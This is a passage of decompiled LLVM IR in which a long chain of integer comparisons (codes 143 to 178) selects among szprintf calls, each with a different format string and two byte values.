  %v3_c8a8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c8b4 = sext i8 %v3_c89c to i32
  %v6_c8b4 = sext i8 %v3_c8a8 to i32
  %v8_c8b4 = call i32 @szprintf(i32 %v2_c890, i32 ptrtoint ([13 x i8]* @global_var_20814.347 to i32), i32 %v4_c8b4, i32 %v6_c8b4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c8b8

dec_label_pc_c8b8:                                ; preds = %dec_label_pc_c884, %dec_label_pc_c890
  %v7_c8bc = icmp eq i32 %v2_a93c, 143
  br i1 %v7_c8bc, label %dec_label_pc_c8c4, label %dec_label_pc_c8ec

dec_label_pc_c8c4:                                ; preds = %dec_label_pc_c8b8
  %v2_c8c4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c8d0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c8dc = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c8e8 = sext i8 %v3_c8d0 to i32
  %v6_c8e8 = sext i8 %v3_c8dc to i32
  %v8_c8e8 = call i32 @szprintf(i32 %v2_c8c4, i32 ptrtoint ([14 x i8]* @global_var_20704.313 to i32), i32 %v4_c8e8, i32 %v6_c8e8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c8ec

dec_label_pc_c8ec:                                ; preds = %dec_label_pc_c8b8, %dec_label_pc_c8c4
  %v7_c8f0 = icmp eq i32 %v2_a93c, 144
  br i1 %v7_c8f0, label %dec_label_pc_c8f8, label %dec_label_pc_c920

dec_label_pc_c8f8:                                ; preds = %dec_label_pc_c8ec
  %v2_c8f8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c904 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c910 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c91c = sext i8 %v3_c904 to i32
  %v6_c91c = sext i8 %v3_c910 to i32
  %v8_c91c = call i32 @szprintf(i32 %v2_c8f8, i32 ptrtoint ([14 x i8]* @global_var_20824.349 to i32), i32 %v4_c91c, i32 %v6_c91c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c920

dec_label_pc_c920:                                ; preds = %dec_label_pc_c8ec, %dec_label_pc_c8f8
  %v7_c924 = icmp eq i32 %v2_a93c, 145
  br i1 %v7_c924, label %dec_label_pc_c92c, label %dec_label_pc_c954

dec_label_pc_c92c:                                ; preds = %dec_label_pc_c920
  %v2_c92c = ptrtoint i32* %stack_var_-36 to i32
  %v3_c938 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c944 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c950 = sext i8 %v3_c938 to i32
  %v6_c950 = sext i8 %v3_c944 to i32
  %v8_c950 = call i32 @szprintf(i32 %v2_c92c, i32 ptrtoint ([14 x i8]* @global_var_20834.351 to i32), i32 %v4_c950, i32 %v6_c950, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c954

dec_label_pc_c954:                                ; preds = %dec_label_pc_c920, %dec_label_pc_c92c
  %v7_c958 = icmp eq i32 %v2_a93c, 146
  br i1 %v7_c958, label %dec_label_pc_c960, label %dec_label_pc_c988

dec_label_pc_c960:                                ; preds = %dec_label_pc_c954
  %v2_c960 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c96c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c978 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c984 = sext i8 %v3_c96c to i32
  %v6_c984 = sext i8 %v3_c978 to i32
  %v8_c984 = call i32 @szprintf(i32 %v2_c960, i32 ptrtoint ([14 x i8]* @global_var_20844.353 to i32), i32 %v4_c984, i32 %v6_c984, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c988

dec_label_pc_c988:                                ; preds = %dec_label_pc_c954, %dec_label_pc_c960
  %v7_c98c = icmp eq i32 %v2_a93c, 147
  br i1 %v7_c98c, label %dec_label_pc_c994, label %dec_label_pc_c9bc

dec_label_pc_c994:                                ; preds = %dec_label_pc_c988
  %v2_c994 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c9a0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c9ac = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c9b8 = sext i8 %v3_c9a0 to i32
  %v6_c9b8 = sext i8 %v3_c9ac to i32
  %v8_c9b8 = call i32 @szprintf(i32 %v2_c994, i32 ptrtoint ([13 x i8]* @global_var_20854.355 to i32), i32 %v4_c9b8, i32 %v6_c9b8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c9bc

dec_label_pc_c9bc:                                ; preds = %dec_label_pc_c988, %dec_label_pc_c994
  %v7_c9c0 = icmp eq i32 %v2_a93c, 148
  br i1 %v7_c9c0, label %dec_label_pc_c9c8, label %dec_label_pc_c9f0

dec_label_pc_c9c8:                                ; preds = %dec_label_pc_c9bc
  %v2_c9c8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_c9d4 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_c9e0 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_c9ec = sext i8 %v3_c9d4 to i32
  %v6_c9ec = sext i8 %v3_c9e0 to i32
  %v8_c9ec = call i32 @szprintf(i32 %v2_c9c8, i32 ptrtoint ([13 x i8]* @global_var_20864.357 to i32), i32 %v4_c9ec, i32 %v6_c9ec, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_c9f0

dec_label_pc_c9f0:                                ; preds = %dec_label_pc_c9bc, %dec_label_pc_c9c8
  %v7_c9f4 = icmp eq i32 %v2_a93c, 149
  br i1 %v7_c9f4, label %dec_label_pc_c9fc, label %dec_label_pc_ca24

dec_label_pc_c9fc:                                ; preds = %dec_label_pc_c9f0
  %v2_c9fc = ptrtoint i32* %stack_var_-36 to i32
  %v3_ca08 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ca14 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ca20 = sext i8 %v3_ca08 to i32
  %v6_ca20 = sext i8 %v3_ca14 to i32
  %v8_ca20 = call i32 @szprintf(i32 %v2_c9fc, i32 ptrtoint ([14 x i8]* @global_var_20874.360 to i32), i32 %v4_ca20, i32 %v6_ca20, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca24

dec_label_pc_ca24:                                ; preds = %dec_label_pc_c9f0, %dec_label_pc_c9fc
  %v7_ca28 = icmp eq i32 %v2_a93c, 150
  br i1 %v7_ca28, label %dec_label_pc_ca30, label %dec_label_pc_ca58

dec_label_pc_ca30:                                ; preds = %dec_label_pc_ca24
  %v2_ca30 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ca3c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ca48 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ca54 = sext i8 %v3_ca3c to i32
  %v6_ca54 = sext i8 %v3_ca48 to i32
  %v8_ca54 = call i32 @szprintf(i32 %v2_ca30, i32 ptrtoint ([14 x i8]* @global_var_20884.362 to i32), i32 %v4_ca54, i32 %v6_ca54, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca58

dec_label_pc_ca58:                                ; preds = %dec_label_pc_ca24, %dec_label_pc_ca30
  %v7_ca5c = icmp eq i32 %v2_a93c, 151
  br i1 %v7_ca5c, label %dec_label_pc_ca64, label %dec_label_pc_ca8c

dec_label_pc_ca64:                                ; preds = %dec_label_pc_ca58
  %v2_ca64 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ca70 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ca7c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ca88 = sext i8 %v3_ca70 to i32
  %v6_ca88 = sext i8 %v3_ca7c to i32
  %v8_ca88 = call i32 @szprintf(i32 %v2_ca64, i32 ptrtoint ([14 x i8]* @global_var_20894.364 to i32), i32 %v4_ca88, i32 %v6_ca88, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ca8c

dec_label_pc_ca8c:                                ; preds = %dec_label_pc_ca58, %dec_label_pc_ca64
  %v7_ca90 = icmp eq i32 %v2_a93c, 152
  br i1 %v7_ca90, label %dec_label_pc_ca98, label %dec_label_pc_cac0

dec_label_pc_ca98:                                ; preds = %dec_label_pc_ca8c
  %v2_ca98 = ptrtoint i32* %stack_var_-36 to i32
  %v3_caa4 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cab0 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cabc = sext i8 %v3_caa4 to i32
  %v6_cabc = sext i8 %v3_cab0 to i32
  %v8_cabc = call i32 @szprintf(i32 %v2_ca98, i32 ptrtoint ([14 x i8]* @global_var_20678.295 to i32), i32 %v4_cabc, i32 %v6_cabc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cac0

dec_label_pc_cac0:                                ; preds = %dec_label_pc_ca8c, %dec_label_pc_ca98
  %v7_cac4 = icmp eq i32 %v2_a93c, 153
  br i1 %v7_cac4, label %dec_label_pc_cacc, label %dec_label_pc_caf4

dec_label_pc_cacc:                                ; preds = %dec_label_pc_cac0
  %v2_cacc = ptrtoint i32* %stack_var_-36 to i32
  %v3_cad8 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cae4 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_caf0 = sext i8 %v3_cad8 to i32
  %v6_caf0 = sext i8 %v3_cae4 to i32
  %v8_caf0 = call i32 @szprintf(i32 %v2_cacc, i32 ptrtoint ([13 x i8]* @global_var_208a4.367 to i32), i32 %v4_caf0, i32 %v6_caf0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_caf4

dec_label_pc_caf4:                                ; preds = %dec_label_pc_cac0, %dec_label_pc_cacc
  %v7_caf8 = icmp eq i32 %v2_a93c, 154
  br i1 %v7_caf8, label %dec_label_pc_cb00, label %dec_label_pc_cb28

dec_label_pc_cb00:                                ; preds = %dec_label_pc_caf4
  %v2_cb00 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb0c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cb18 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cb24 = sext i8 %v3_cb0c to i32
  %v6_cb24 = sext i8 %v3_cb18 to i32
  %v8_cb24 = call i32 @szprintf(i32 %v2_cb00, i32 ptrtoint ([13 x i8]* @global_var_208b4.369 to i32), i32 %v4_cb24, i32 %v6_cb24, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb28

dec_label_pc_cb28:                                ; preds = %dec_label_pc_caf4, %dec_label_pc_cb00
  %v7_cb2c = icmp eq i32 %v2_a93c, 155
  br i1 %v7_cb2c, label %dec_label_pc_cb34, label %dec_label_pc_cb5c

dec_label_pc_cb34:                                ; preds = %dec_label_pc_cb28
  %v2_cb34 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb40 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cb4c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cb58 = sext i8 %v3_cb40 to i32
  %v6_cb58 = sext i8 %v3_cb4c to i32
  %v8_cb58 = call i32 @szprintf(i32 %v2_cb34, i32 ptrtoint ([13 x i8]* @global_var_208c4.371 to i32), i32 %v4_cb58, i32 %v6_cb58, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb5c

dec_label_pc_cb5c:                                ; preds = %dec_label_pc_cb28, %dec_label_pc_cb34
  %v7_cb60 = icmp eq i32 %v2_a93c, 156
  br i1 %v7_cb60, label %dec_label_pc_cb68, label %dec_label_pc_cb90

dec_label_pc_cb68:                                ; preds = %dec_label_pc_cb5c
  %v2_cb68 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cb74 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cb80 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cb8c = sext i8 %v3_cb74 to i32
  %v6_cb8c = sext i8 %v3_cb80 to i32
  %v8_cb8c = call i32 @szprintf(i32 %v2_cb68, i32 ptrtoint ([13 x i8]* @global_var_208d4.373 to i32), i32 %v4_cb8c, i32 %v6_cb8c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cb90

dec_label_pc_cb90:                                ; preds = %dec_label_pc_cb5c, %dec_label_pc_cb68
  %v7_cb94 = icmp eq i32 %v2_a93c, 157
  br i1 %v7_cb94, label %dec_label_pc_cb9c, label %dec_label_pc_cbc4

dec_label_pc_cb9c:                                ; preds = %dec_label_pc_cb90
  %v2_cb9c = ptrtoint i32* %stack_var_-36 to i32
  %v3_cba8 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cbb4 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cbc0 = sext i8 %v3_cba8 to i32
  %v6_cbc0 = sext i8 %v3_cbb4 to i32
  %v8_cbc0 = call i32 @szprintf(i32 %v2_cb9c, i32 ptrtoint ([13 x i8]* @global_var_208e4.375 to i32), i32 %v4_cbc0, i32 %v6_cbc0, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cbc4

dec_label_pc_cbc4:                                ; preds = %dec_label_pc_cb90, %dec_label_pc_cb9c
  %v7_cbc8 = icmp eq i32 %v2_a93c, 158
  br i1 %v7_cbc8, label %dec_label_pc_cbd0, label %dec_label_pc_cbf8

dec_label_pc_cbd0:                                ; preds = %dec_label_pc_cbc4
  %v2_cbd0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cbdc = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cbe8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cbf4 = sext i8 %v3_cbdc to i32
  %v6_cbf4 = sext i8 %v3_cbe8 to i32
  %v8_cbf4 = call i32 @szprintf(i32 %v2_cbd0, i32 ptrtoint ([12 x i8]* @global_var_208f4.377 to i32), i32 %v4_cbf4, i32 %v6_cbf4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cbf8

dec_label_pc_cbf8:                                ; preds = %dec_label_pc_cbc4, %dec_label_pc_cbd0
  %v7_cbfc = icmp eq i32 %v2_a93c, 159
  br i1 %v7_cbfc, label %dec_label_pc_cc04, label %dec_label_pc_cc2c

dec_label_pc_cc04:                                ; preds = %dec_label_pc_cbf8
  %v2_cc04 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cc10 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cc1c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cc28 = sext i8 %v3_cc10 to i32
  %v6_cc28 = sext i8 %v3_cc1c to i32
  %v8_cc28 = call i32 @szprintf(i32 %v2_cc04, i32 ptrtoint ([14 x i8]* @global_var_20900.379 to i32), i32 %v4_cc28, i32 %v6_cc28, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc2c

dec_label_pc_cc2c:                                ; preds = %dec_label_pc_cbf8, %dec_label_pc_cc04
  %v7_cc30 = icmp eq i32 %v2_a93c, 160
  br i1 %v7_cc30, label %dec_label_pc_cc38, label %dec_label_pc_cc60

dec_label_pc_cc38:                                ; preds = %dec_label_pc_cc2c
  %v2_cc38 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cc44 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cc50 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cc5c = sext i8 %v3_cc44 to i32
  %v6_cc5c = sext i8 %v3_cc50 to i32
  %v8_cc5c = call i32 @szprintf(i32 %v2_cc38, i32 ptrtoint ([13 x i8]* @global_var_20910.381 to i32), i32 %v4_cc5c, i32 %v6_cc5c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc60

dec_label_pc_cc60:                                ; preds = %dec_label_pc_cc2c, %dec_label_pc_cc38
  %v7_cc64 = icmp eq i32 %v2_a93c, 161
  br i1 %v7_cc64, label %dec_label_pc_cc6c, label %dec_label_pc_cc94

dec_label_pc_cc6c:                                ; preds = %dec_label_pc_cc60
  %v2_cc6c = ptrtoint i32* %stack_var_-36 to i32
  %v3_cc78 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cc84 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cc90 = sext i8 %v3_cc78 to i32
  %v6_cc90 = sext i8 %v3_cc84 to i32
  %v8_cc90 = call i32 @szprintf(i32 %v2_cc6c, i32 ptrtoint ([14 x i8]* @global_var_20920.383 to i32), i32 %v4_cc90, i32 %v6_cc90, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cc94

dec_label_pc_cc94:                                ; preds = %dec_label_pc_cc60, %dec_label_pc_cc6c
  %v7_cc98 = icmp eq i32 %v2_a93c, 162
  br i1 %v7_cc98, label %dec_label_pc_cca0, label %dec_label_pc_ccc8

dec_label_pc_cca0:                                ; preds = %dec_label_pc_cc94
  %v2_cca0 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ccac = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ccb8 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ccc4 = sext i8 %v3_ccac to i32
  %v6_ccc4 = sext i8 %v3_ccb8 to i32
  %v8_ccc4 = call i32 @szprintf(i32 %v2_cca0, i32 ptrtoint ([14 x i8]* @global_var_20930.385 to i32), i32 %v4_ccc4, i32 %v6_ccc4, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ccc8

dec_label_pc_ccc8:                                ; preds = %dec_label_pc_cc94, %dec_label_pc_cca0
  %v7_cccc = icmp eq i32 %v2_a93c, 163
  br i1 %v7_cccc, label %dec_label_pc_ccd4, label %dec_label_pc_ccfc

dec_label_pc_ccd4:                                ; preds = %dec_label_pc_ccc8
  %v2_ccd4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cce0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ccec = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ccf8 = sext i8 %v3_cce0 to i32
  %v6_ccf8 = sext i8 %v3_ccec to i32
  %v8_ccf8 = call i32 @szprintf(i32 %v2_ccd4, i32 ptrtoint ([14 x i8]* @global_var_20940.387 to i32), i32 %v4_ccf8, i32 %v6_ccf8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ccfc

dec_label_pc_ccfc:                                ; preds = %dec_label_pc_ccc8, %dec_label_pc_ccd4
  %v7_cd00 = icmp eq i32 %v2_a93c, 164
  br i1 %v7_cd00, label %dec_label_pc_cd08, label %dec_label_pc_cd30

dec_label_pc_cd08:                                ; preds = %dec_label_pc_ccfc
  %v2_cd08 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd14 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cd20 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cd2c = sext i8 %v3_cd14 to i32
  %v6_cd2c = sext i8 %v3_cd20 to i32
  %v8_cd2c = call i32 @szprintf(i32 %v2_cd08, i32 ptrtoint ([14 x i8]* @global_var_20894.364 to i32), i32 %v4_cd2c, i32 %v6_cd2c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd30

dec_label_pc_cd30:                                ; preds = %dec_label_pc_ccfc, %dec_label_pc_cd08
  %v7_cd34 = icmp eq i32 %v2_a93c, 165
  br i1 %v7_cd34, label %dec_label_pc_cd3c, label %dec_label_pc_cd64

dec_label_pc_cd3c:                                ; preds = %dec_label_pc_cd30
  %v2_cd3c = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd48 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cd54 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cd60 = sext i8 %v3_cd48 to i32
  %v6_cd60 = sext i8 %v3_cd54 to i32
  %v8_cd60 = call i32 @szprintf(i32 %v2_cd3c, i32 ptrtoint ([13 x i8]* @global_var_20950.389 to i32), i32 %v4_cd60, i32 %v6_cd60, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd64

dec_label_pc_cd64:                                ; preds = %dec_label_pc_cd30, %dec_label_pc_cd3c
  %v7_cd68 = icmp eq i32 %v2_a93c, 166
  br i1 %v7_cd68, label %dec_label_pc_cd70, label %dec_label_pc_cd98

dec_label_pc_cd70:                                ; preds = %dec_label_pc_cd64
  %v2_cd70 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cd7c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cd88 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cd94 = sext i8 %v3_cd7c to i32
  %v6_cd94 = sext i8 %v3_cd88 to i32
  %v8_cd94 = call i32 @szprintf(i32 %v2_cd70, i32 ptrtoint ([14 x i8]* @global_var_20960.391 to i32), i32 %v4_cd94, i32 %v6_cd94, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cd98

dec_label_pc_cd98:                                ; preds = %dec_label_pc_cd64, %dec_label_pc_cd70
  %v7_cd9c = icmp eq i32 %v2_a93c, 167
  br i1 %v7_cd9c, label %dec_label_pc_cda4, label %dec_label_pc_cdcc

dec_label_pc_cda4:                                ; preds = %dec_label_pc_cd98
  %v2_cda4 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cdb0 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cdbc = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cdc8 = sext i8 %v3_cdb0 to i32
  %v6_cdc8 = sext i8 %v3_cdbc to i32
  %v8_cdc8 = call i32 @szprintf(i32 %v2_cda4, i32 ptrtoint ([14 x i8]* @global_var_20900.379 to i32), i32 %v4_cdc8, i32 %v6_cdc8, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cdcc

dec_label_pc_cdcc:                                ; preds = %dec_label_pc_cd98, %dec_label_pc_cda4
  %v7_cdd0 = icmp eq i32 %v2_a93c, 168
  br i1 %v7_cdd0, label %dec_label_pc_cdd8, label %dec_label_pc_ce00

dec_label_pc_cdd8:                                ; preds = %dec_label_pc_cdcc
  %v2_cdd8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cde4 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cdf0 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cdfc = sext i8 %v3_cde4 to i32
  %v6_cdfc = sext i8 %v3_cdf0 to i32
  %v8_cdfc = call i32 @szprintf(i32 %v2_cdd8, i32 ptrtoint ([14 x i8]* @global_var_20970.393 to i32), i32 %v4_cdfc, i32 %v6_cdfc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce00

dec_label_pc_ce00:                                ; preds = %dec_label_pc_cdcc, %dec_label_pc_cdd8
  %v7_ce04 = icmp eq i32 %v2_a93c, 169
  br i1 %v7_ce04, label %dec_label_pc_ce0c, label %dec_label_pc_ce34

dec_label_pc_ce0c:                                ; preds = %dec_label_pc_ce00
  %v2_ce0c = ptrtoint i32* %stack_var_-36 to i32
  %v3_ce18 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ce24 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ce30 = sext i8 %v3_ce18 to i32
  %v6_ce30 = sext i8 %v3_ce24 to i32
  %v8_ce30 = call i32 @szprintf(i32 %v2_ce0c, i32 ptrtoint ([14 x i8]* @global_var_20980.395 to i32), i32 %v4_ce30, i32 %v6_ce30, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce34

dec_label_pc_ce34:                                ; preds = %dec_label_pc_ce00, %dec_label_pc_ce0c
  %v7_ce38 = icmp eq i32 %v2_a93c, 171
  br i1 %v7_ce38, label %dec_label_pc_ce40, label %dec_label_pc_ce68

dec_label_pc_ce40:                                ; preds = %dec_label_pc_ce34
  %v2_ce40 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ce4c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ce58 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ce64 = sext i8 %v3_ce4c to i32
  %v6_ce64 = sext i8 %v3_ce58 to i32
  %v8_ce64 = call i32 @szprintf(i32 %v2_ce40, i32 ptrtoint ([14 x i8]* @global_var_20990.397 to i32), i32 %v4_ce64, i32 %v6_ce64, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce68

dec_label_pc_ce68:                                ; preds = %dec_label_pc_ce34, %dec_label_pc_ce40
  %v7_ce6c = icmp eq i32 %v2_a93c, 172
  br i1 %v7_ce6c, label %dec_label_pc_ce74, label %dec_label_pc_ce9c

dec_label_pc_ce74:                                ; preds = %dec_label_pc_ce68
  %v2_ce74 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ce80 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_ce8c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_ce98 = sext i8 %v3_ce80 to i32
  %v6_ce98 = sext i8 %v3_ce8c to i32
  %v8_ce98 = call i32 @szprintf(i32 %v2_ce74, i32 ptrtoint ([14 x i8]* @global_var_209a0.399 to i32), i32 %v4_ce98, i32 %v6_ce98, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ce9c

dec_label_pc_ce9c:                                ; preds = %dec_label_pc_ce68, %dec_label_pc_ce74
  %v7_cea0 = icmp eq i32 %v2_a93c, 173
  br i1 %v7_cea0, label %dec_label_pc_cea8, label %dec_label_pc_ced0

dec_label_pc_cea8:                                ; preds = %dec_label_pc_ce9c
  %v2_cea8 = ptrtoint i32* %stack_var_-36 to i32
  %v3_ceb4 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cec0 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cecc = sext i8 %v3_ceb4 to i32
  %v6_cecc = sext i8 %v3_cec0 to i32
  %v8_cecc = call i32 @szprintf(i32 %v2_cea8, i32 ptrtoint ([14 x i8]* @global_var_209b0.401 to i32), i32 %v4_cecc, i32 %v6_cecc, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_ced0

dec_label_pc_ced0:                                ; preds = %dec_label_pc_ce9c, %dec_label_pc_cea8
  %v7_ced4 = icmp eq i32 %v2_a93c, 174
  br i1 %v7_ced4, label %dec_label_pc_cedc, label %dec_label_pc_cf04

dec_label_pc_cedc:                                ; preds = %dec_label_pc_ced0
  %v2_cedc = ptrtoint i32* %stack_var_-36 to i32
  %v3_cee8 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cef4 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cf00 = sext i8 %v3_cee8 to i32
  %v6_cf00 = sext i8 %v3_cef4 to i32
  %v8_cf00 = call i32 @szprintf(i32 %v2_cedc, i32 ptrtoint ([13 x i8]* @global_var_209c0.403 to i32), i32 %v4_cf00, i32 %v6_cf00, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf04

dec_label_pc_cf04:                                ; preds = %dec_label_pc_ced0, %dec_label_pc_cedc
  %v7_cf08 = icmp eq i32 %v2_a93c, 175
  br i1 %v7_cf08, label %dec_label_pc_cf10, label %dec_label_pc_cf38

dec_label_pc_cf10:                                ; preds = %dec_label_pc_cf04
  %v2_cf10 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cf1c = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cf28 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cf34 = sext i8 %v3_cf1c to i32
  %v6_cf34 = sext i8 %v3_cf28 to i32
  %v8_cf34 = call i32 @szprintf(i32 %v2_cf10, i32 ptrtoint ([14 x i8]* @global_var_209d0.405 to i32), i32 %v4_cf34, i32 %v6_cf34, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf38

dec_label_pc_cf38:                                ; preds = %dec_label_pc_cf04, %dec_label_pc_cf10
  %v7_cf3c = icmp eq i32 %v2_a93c, 176
  br i1 %v7_cf3c, label %dec_label_pc_cf44, label %dec_label_pc_cf6c

dec_label_pc_cf44:                                ; preds = %dec_label_pc_cf38
  %v2_cf44 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cf50 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cf5c = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cf68 = sext i8 %v3_cf50 to i32
  %v6_cf68 = sext i8 %v3_cf5c to i32
  %v8_cf68 = call i32 @szprintf(i32 %v2_cf44, i32 ptrtoint ([14 x i8]* @global_var_209e0.407 to i32), i32 %v4_cf68, i32 %v6_cf68, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cf6c

dec_label_pc_cf6c:                                ; preds = %dec_label_pc_cf38, %dec_label_pc_cf44
  %v7_cf70 = icmp eq i32 %v2_a93c, 177
  br i1 %v7_cf70, label %dec_label_pc_cf78, label %dec_label_pc_cfa0

dec_label_pc_cf78:                                ; preds = %dec_label_pc_cf6c
  %v2_cf78 = ptrtoint i32* %stack_var_-36 to i32
  %v3_cf84 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cf90 = load i8, i8* @global_var_2e4fa.70, align 1
  %v4_cf9c = sext i8 %v3_cf84 to i32
  %v6_cf9c = sext i8 %v3_cf90 to i32
  %v8_cf9c = call i32 @szprintf(i32 %v2_cf78, i32 ptrtoint ([14 x i8]* @global_var_209f0.409 to i32), i32 %v4_cf9c, i32 %v6_cf9c, i32 ptrtoint (i32* @0 to i32))
  br label %dec_label_pc_cfa0

dec_label_pc_cfa0:                                ; preds = %dec_label_pc_cf6c, %dec_label_pc_cf78
  %v7_cfa4 = icmp eq i32 %v2_a93c, 178
  br i1 %v7_cfa4, label %dec_label_pc_cfac, label %dec_label_pc_cfd4

dec_label_pc_cfac:                                ; preds = %dec_label_pc_cfa0
  %v2_cfac = ptrtoint i32* %stack_var_-36 to i32
  %v3_cfb8 = load i8, i8* @global_var_2e4f9.69, align 1
  %v3_cfc4 = load i8, i8* @global_var_2e4fa.70, align 1
